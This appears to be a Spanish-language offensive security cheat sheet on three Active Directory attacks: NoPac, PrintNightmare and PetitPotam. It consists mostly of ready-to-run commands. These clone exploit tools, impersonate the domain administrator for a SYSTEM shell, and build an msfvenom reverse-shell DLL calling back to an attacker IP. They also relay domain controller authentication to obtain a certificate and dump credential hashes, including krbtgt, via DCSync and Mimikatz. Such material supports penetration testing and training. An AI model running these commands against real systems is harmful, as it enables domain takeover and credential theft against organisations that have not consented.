---
tags:
  - AD
  - attack
  - cve
  - nopac
  - printnightmare
  - petitpotam
---
# NoPac (SamAccountName Spoofing)

## Conceptos Clave (TL;DR)

* Vulnerabilidad compuesta por dos CVEs (CVE-2021-42278 y CVE-2021-42287) que permite a un usuario estándar escalar a Domain Admin en un solo comando.
* CVE-2021-42278 es un bypass del Security Account Manager (SAM), y CVE-2021-42287 afecta al Privilege Attribute Certificate (PAC) de Kerberos.
* Abusa del límite predeterminado que permite a los usuarios autenticados agregar hasta 10 computadoras al dominio.
* El ataque consiste en crear una cuenta de máquina, cambiar su nombre (SamAccountName) para que coincida con el de un Domain Controller (DC) y solicitar tickets Kerberos (TGS), obteniendo así los privilegios del DC.
  

## Herramientas Clave

* **Impacket:** Utilizado para la comunicación, carga de payloads y ejecución de comandos.
* **Repositorio noPac (Ridter):** Contiene los scripts `scanner.py` (para verificar vulnerabilidad) y `noPac.py` (para la explotación).
  

## Metodología Paso a Paso

1. **Validación de la cuota:** Se verifica si la cuota de creación de cuentas de máquina (ms-DS-MachineAccountQuota) es mayor a 0.

2. **Escaneo de vulnerabilidad:** Se utiliza `scanner.py` con un usuario estándar para intentar obtener un TGT del DC. Si se obtiene, el sistema es vulnerable.

3. **Explotación y ejecución:** Se usa `noPac.py` para suplantar a la cuenta de Administrador integrado, lo que permite obtener una shell interactiva (SYSTEM) o realizar un DCSync directo.

4. **Post-Explotación (Limpieza):** El script guarda el TGT (archivo ccache) en el disco local; es necesario identificarlo y eliminarlo tras su uso.


## Cheat Sheet de Comandos
```bash
# Clonar repositorios necesarios e instalar dependencias

git clone [https://github.com/SecureAuthCorp/impacket.git](https://github.com/SecureAuthCorp/impacket.git)

cd impacket && python setup.py install

git clone https://github.com/Ridter/noPac.git
```

```bash   
# Escanear si el DC es vulnerable (Requiere credenciales válidas)
# -dc-ip: Dirección IP del Domain Controller objetivo
# -use-ldap: Utiliza LDAP para consultas

sudo python3 scanner.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -use-ldap
```

```bash  
# Explotación: Obtener una semi-interactive shell (NT AUTHORITY\SYSTEM)
# -dc-host: Nombre de host (hostname) del Domain Controller
# --impersonate: Cuenta a suplantar (usualmente administrator)
# -shell: Lanza la sesión smbexec

sudo python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> -shell --impersonate administrator -use-ldap
```

```bash  
# Explotación: Ejecutar DCSync para extraer hashes NTLM (sin obtener shell)
# -dump: Extrae credenciales
# -just-dc-user: Especifica el usuario del cual extraer el hash (para evitar dumpear todo el dominio)

sudo python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
```

  
## "Gotchas" y Troubleshooting

* Si el valor `ms-DS-MachineAccountQuota` ha sido configurado en 0 por los administradores, el ataque fallará inevitablemente ya que no se podrán crear cuentas de máquina.

* La shell interactiva de `noPac.py` utiliza `smbexec.py`, lo que implica que la navegación tradicional con `cd` no funciona (requiere rutas absolutas).

* `smbexec.py` es ruidoso operativamente: crea servicios llamados BTOBTO y BTOBO, y ejecuta comandos a través de un archivo `.bat` (execute.bat), lo cual es comúnmente detectado por Windows Defender y otras soluciones EDR/AV.

  

---
# PrintNightmare
 

## Conceptos Clave (TL;DR)

* Conjunto de vulnerabilidades (CVE-2021-34527 y CVE-2021-1675) presentes en el servicio Print Spooler de Windows.
* Permite escalamiento de privilegios local y ejecución remota de código (RCE).
* Puede ser abusado para obtener una sesión remota como SYSTEM en un Domain Controller.

  
## Herramientas Clave

* **Impacket (Versión de cube0x0):** Requiere una bifurcación específica de Impacket para ejecutar la llamada RPC correctamente.

* **rpcdump.py:** Utilizado para enumerar si los protocolos RPC del Print Spooler están expuestos.

* **msfvenom & smbserver.py:** Para crear y alojar el payload (DLL malicioso).

* **CVE-2021-1675.py (cube0x0):** Script principal de explotación.
  

## Metodología Paso a Paso

1. **Reemplazar Impacket:** Desinstalar Impacket estándar e instalar la versión de cube0x0.

2. **Enumeración:** Validar que los protocolos MS-RPRN o MS-PAR estén activos en el objetivo.

3. **Generación del Payload:** Crear una DLL inversa utilizando msfvenom.

4. **Hosting:** Montar un recurso compartido SMB en el equipo atacante que sirva la DLL.

5. **Ejecución:** Apuntar el exploit al objetivo, forzando la carga de la DLL alojada en el servidor SMB atacante, devolviendo una shell SYSTEM.

## Cheat Sheet de Comandos
```bash
# Preparar entorno: Instalar Impacket de cube0x0

pip3 uninstall impacket

git clone [https://github.com/cube0x0/impacket](https://github.com/cube0x0/impacket)

cd impacket && python3 ./setup.py install
```
  
```bash
# Descargar exploit

git clone [https://github.com/cube0x0/CVE-2021-1675.git](https://github.com/cube0x0/CVE-2021-1675.git)
```
  
```bash
# Enumerar si el DC expone protocolos del Print Spooler

rpcdump.py @<TARGET_IP> | egrep 'MS-RPRN|MS-PAR'
```
  
```bash
# Generar payload DLL inverso
# Sustituir <ATTACKER_IP> y <LPORT>

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f dll > payload.dll
```
  
```bash
# Levantar un servidor SMB temporal para alojar el payload
# -smb2support: Habilita la compatibilidad con SMBv2

sudo smbserver.py -smb2support <SHARE_NAME> /ruta/directorio_del_payload
```
  
```bash
# Ejecutar el exploit PrintNightmare
# Pasar la ruta UNC del servidor SMB atacante al final del comando

sudo python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> '\\<ATTACKER_IP>\<SHARE_NAME>\payload.dll'
```

  

## "Gotchas" y Troubleshooting

* Es estricto el uso de la versión de Impacket de *cube0x0*; la versión base fallará.
* El ataque conlleva un riesgo de denegación de servicio: podría crashear el servicio Print Spooler remoto.
* Asegúrate de tener Metasploit (`multi/handler`) u otro listener a la escucha antes de disparar el exploit.

  
---
# PetitPotam (MS-EFSRPC)

  
## Conceptos Clave (TL;DR)

* Vulnerabilidad de LSA spoofing (CVE-2021-36942) que coacciona a un DC para que se autentique contra un host controlado por el atacante mediante NTLM (puerto 445).
* Abusa del protocolo MS-EFSRPC mediante la función de Local Security Authority Remote Protocol (LSARPC).
* El ataque es no autenticado. Intercepta la autenticación del DC y la retransmite (relay) hacia la página de Web Enrollment de Active Directory Certificate Services (AD CS).
* El resultado es la emisión de un certificado digital a nombre de la cuenta de máquina del DC, que luego se usa para solicitar un TGT y comprometer el dominio vía DCSync.

  
## Herramientas Clave

* **ntlmrelayx.py:** Para capturar y retransmitir la autenticación hacia AD CS.
* **PetitPotam:** Script (o ejecutable/PowerShell) para gatillar la coacción de autenticación.
* **PKINITtools (gettgtpkinit.py / getnthash.py):** Para solicitar el TGT y extraer el hash NTLM usando el certificado base64 obtenido.
* **Rubeus:** Alternativa en Windows para realizar un ataque Pass-The-Ticket (PTT) con el certificado.

  
## Metodología Paso a Paso

1. **Configurar Relay:** Levantar `ntlmrelayx.py` apuntando a la URL de inscripción web de la Autoridad Certificadora (CA).
2. **Coaccionar DC:** Utilizar PetitPotam para forzar al DC a conectarse al equipo atacante.
3. **Captura de Certificado:** Recuperar el certificado codificado en Base64 emitido para el DC desde la salida del relay.
4. **Solicitud de TGT:** Consumir el certificado usando `gettgtpkinit.py` para obtener un archivo `.ccache` (TGT).
5. **DCSync:** Exportar el TGT a las variables de entorno e invocar `secretsdump.py` para dumpear hashes del dominio.

  
## Cheat Sheet de Comandos
```bash
# 1. Iniciar NTLM Relay hacia la CA
# --target: URL exacta de Web Enrollment de la Autoridad Certificadora
# --template: Plantilla a abusar (generalmente DomainController)

sudo ntlmrelayx.py -debug -smb2support --target http://<CA_HOSTNAME>.<DOMAIN>/certsrv/certfnsh.asp --adcs --template DomainController
```
  
```bash
# 2. Coaccionar la autenticación del DC (desde otra terminal)

python3 PetitPotam.py <ATTACKER_IP> <DC_IP>
```
  
```bash
# 3. Solicitar un TGT usando el certificado Base64 obtenido (Copiado de ntlmrelayx)
# -pfx-base64: El blob base64 largo capturado
# Termina con el archivo de salida (ej. dc01.ccache)

python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_HOSTNAME>\$ -pfx-base64 <BASE64_CERT> <DC_HOSTNAME>.ccache
```
  
```bash
# 4. Establecer la variable de entorno para usar el ticket Kerberos

export KRB5CCNAME=<DC_HOSTNAME>.ccache

klist # Verificar que el ticket está cargado
```
  
```bash
# 5. Ejecutar DCSync contra el usuario Administrador
# -k: Usar autenticación Kerberos
# -no-pass: No pedir contraseña (usa el TGT)

secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass "<DC_HOSTNAME>$"@<DC_HOSTNAME>.<DOMAIN>
```
  
```bash
# (Alternativo) Obtener el hash NT de la máquina directamente usando PKINITtools
# -key: La clave de cifrado AS-REP arrojada por gettgtpkinit.py

python /opt/PKINITtools/getnthash.py -key <AS_REP_KEY> <DOMAIN>/<DC_HOSTNAME>\$
```

```powershell
# (Alternativa Windows) Usar Rubeus para solicitar TGT y hacer PTT directo en memoria

.\Rubeus.exe asktgt /user:<DC_HOSTNAME>$ /certificate:<BASE64_CERT> /ptt
  

# Validar ticket y ejecutar DCSync con Mimikatz

klist

.\mimikatz.exe "lsadump::dcsync /user:<DOMAIN>\krbtgt" exit
```

  

## "Gotchas" y Troubleshooting

* Requiere explícitamente que la infraestructura corra Active Directory Certificate Services (AD CS) con la interfaz de Web Enrollment activa.

* Debes saber la ubicación exacta de la CA. Si se desconoce, puede usarse una herramienta como `certi` para ubicarla.

* El ataque es inefectivo si la organización implementó mitigaciones como desactivar NTLM en los DC/AD CS o forzar "Extended Protection for Authentication" en IIS.

* La coacción también puede gatillarse desde Windows usando el módulo de encriptación de archivos (EFS) en Mimikatz: `misc::efs /server:<DC_IP> /connect:<ATTACKER_IP>`.